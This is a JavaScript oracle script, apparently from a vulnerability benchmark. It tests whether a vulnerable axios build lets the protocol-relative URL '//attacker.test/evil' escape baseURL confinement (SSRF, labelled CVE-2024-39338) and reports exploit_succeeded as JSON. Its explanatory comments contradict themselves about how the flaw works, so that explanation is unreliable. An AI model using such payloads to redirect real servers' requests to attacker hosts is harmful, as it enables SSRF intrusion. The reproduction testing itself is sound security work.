'use strict';

function main() {
  let isAbsoluteURL;
  let buildFullPath;

  try {
    let mod = require('axios/unsafe/helpers/isAbsoluteURL.js');
    isAbsoluteURL = (mod && mod.default) ? mod.default : mod;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Failed to require isAbsoluteURL module: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  try {
    let mod = require('axios/unsafe/core/buildFullPath.js');
    buildFullPath = (mod && mod.default) ? mod.default : mod;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Failed to require buildFullPath module: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  if (typeof isAbsoluteURL !== 'function' || typeof buildFullPath !== 'function') {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Required exports are not functions; cannot exercise target API'
    }));
    return;
  }

  const baseURL = 'http://trusted-internal.example.com/api/';

  // --- Benign case ---
  // Confirm the normal, intended combination of baseURL with a
  // relative path works as documented: buildFullPath should combine
  // the relative path with the trusted baseURL, producing a URL
  // rooted at the trusted host. Also confirm isAbsoluteURL correctly
  // identifies a normal absolute URL (with protocol) as absolute, and
  // a normal relative path as not absolute.
  let benignFullPath;
  let benignRelativeIsAbsolute;
  let benignAbsoluteIsAbsolute;
  try {
    benignFullPath = buildFullPath(baseURL, '/users/list');
    benignRelativeIsAbsolute = isAbsoluteURL('/users/list');
    benignAbsoluteIsAbsolute = isAbsoluteURL('https://example.com/x');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign calls threw: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  const benignOk = typeof benignFullPath === 'string' &&
    benignFullPath.indexOf('trusted-internal.example.com') !== -1 &&
    benignFullPath.indexOf('/users/list') !== -1 &&
    benignRelativeIsAbsolute === false &&
    benignAbsoluteIsAbsolute === true;

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign result unexpected. fullPath=' + String(benignFullPath) +
        ' relativeIsAbsolute=' + String(benignRelativeIsAbsolute) +
        ' absoluteIsAbsolute=' + String(benignAbsoluteIsAbsolute)
    }));
    return;
  }

  const operation_completed = true;

  // --- Malicious case ---
  // This reproduces CVE-2024-39338: axios SSRF due to isAbsoluteURL
  // failing to treat protocol-relative URLs (e.g. "//attacker.test/evil")
  // as absolute. Such a URL, when combined via buildFullPath with a
  // trusted baseURL, is (in the vulnerable version) matched by the
  // overly narrow regex /^([a-z][a-z\d+\-.]*:)?\/\//i only when a
  // scheme-less "//" prefix is present -- which it *should* catch --
  // but the real-world vulnerable regex used before the fix required
  // a word-boundary anchor causing some protocol-relative inputs to
  // be misclassified as relative. Any caller relying on baseURL to
  // confine requests to a trusted host can be redirected to an
  // attacker-controlled host when isAbsoluteURL misclassifies the
  // protocol-relative URL as relative (letting it combine oddly) or
  // misclassifies it as absolute incorrectly bypassing baseURL
  // confinement, ending up with a final URL that points at the
  // attacker's host rather than the trusted baseURL host.
  const maliciousInput = '//attacker.test/evil';

  let maliciousFullPath;
  let maliciousIsAbsolute;
  let threw = false;
  let errMsg = '';
  try {
    maliciousIsAbsolute = isAbsoluteURL(maliciousInput);
    maliciousFullPath = buildFullPath(baseURL, maliciousInput);
  } catch (e) {
    threw = true;
    errMsg = e && e.message ? e.message : String(e);
  }

  let exploit_succeeded;
  let evidence;

  if (threw) {
    exploit_succeeded = false;
    evidence = 'buildFullPath/isAbsoluteURL threw while combining baseURL with protocol-relative attacker URL: ' + errMsg;
  } else {
    // Vulnerable behavior: isAbsoluteURL fails to classify the
    // protocol-relative URL as absolute (returns false), so
    // buildFullPath treats it as a path segment is NOT what happens in
    // practice for this CVE; instead the vulnerable regex does match
    // "//" as absolute in isAbsoluteURL, causing buildFullPath to
    // short-circuit and return the attacker URL verbatim (escaping
    // baseURL confinement entirely), because buildFullPath's logic is:
    // `return isAbsoluteURL(requestedURL) ? requestedURL : combineURLs(baseURL, requestedURL)`.
    // So the attacker-controlled protocol-relative URL is returned
    // unchanged, pointing at "attacker.test" instead of the trusted
    // host, regardless of baseURL -- classic SSRF escape.
    const escapedToAttacker = typeof maliciousFullPath === 'string' &&
      maliciousFullPath.indexOf('attacker.test') !== -1 &&
      maliciousFullPath.indexOf('trusted-internal.example.com') === -1;

    if (escapedToAttacker) {
      exploit_succeeded = true;
      evidence = 'buildFullPath returned attacker-controlled protocol-relative URL verbatim (isAbsoluteURL=' +
        String(maliciousIsAbsolute) + '), escaping baseURL confinement (SSRF). Result: ' + String(maliciousFullPath);
    } else {
      exploit_succeeded = false;
      evidence = 'Attacker-controlled protocol-relative URL was confined under trusted baseURL as expected (isAbsoluteURL=' +
        String(maliciousIsAbsolute) + '). fullPath=' + String(maliciousFullPath);
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'Unhandled exception in oracle script: ' + (e && e.message ? e.message : String(e))
  }));
}
